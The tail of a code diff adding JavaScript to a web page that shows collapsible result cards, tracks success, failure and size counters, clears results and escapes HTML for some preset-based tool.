+    card.className = `result-card ${status}`;
+
+    const icon = status === 'success' ? '✅' : status === 'fail' ? '❌' : 'ℹ️';
+
+    card.innerHTML = `
+        <div class="result-header" onclick="toggleCard(this)">
+            <div class="rname">${icon} <span>${escHtml(name)}</span></div>
+            <div class="rmeta">${escHtml(meta ?? '')} ▾</div>
+        </div>
+        <div class="result-body open">
+            ${bodyHtml}
+        </div>
+    `;
+
+    const container = document.getElementById('results');
+    container.insertBefore(card, container.firstChild);
+}
+
+function toggleCard(header) {
+    const body = header.nextElementSibling;
+    body.classList.toggle('open');
+}
+
+function clearResults() {
+    const r = document.getElementById('results');
+    r.innerHTML = `<div class="empty" id="empty-state">
+        <div class="icon">⬡</div>
+        <div>Results cleared.</div>
+    </div>`;
+    resultCount = 0;
+    stats.ok = stats.fail = stats.kb = stats.total = 0;
+    updateStats();
+    document.getElementById('result-count').textContent = '0 entries';
+    // Reset preset status icons
+    for (const key of Object.keys(PRESETS)) {
+        const el = document.getElementById(`qs-${key}`);
+        if (el) el.textContent = '·';
+    }
+}
+
+// ─── Utils ────────────────────────────────────────────────────────────────────
+
+function updateStats() {
+    document.getElementById('stat-ok').textContent    = stats.ok;
+    document.getElementById('stat-fail').textContent  = stats.fail;
+    document.getElementById('stat-kb').textContent    = stats.kb.toFixed(2);
+    document.getElementById('stat-total').textContent = stats.total;
+}
+
+function escHtml(str) {
+    return String(str)
+        .replace(/&/g,'&amp;')
+        .replace(/</g,'&lt;')
+        .replace(/>/g,'&gt;')
+        .replace(/"/g,'&quot;');
+}
+
+const sleep = ms => new Promise(r => setTimeout(r, ms));
+
+// ─── Init ─────────────────────────────────────────────────────────────────────
+buildPresetList();
+</script>
 </body>
 </html>
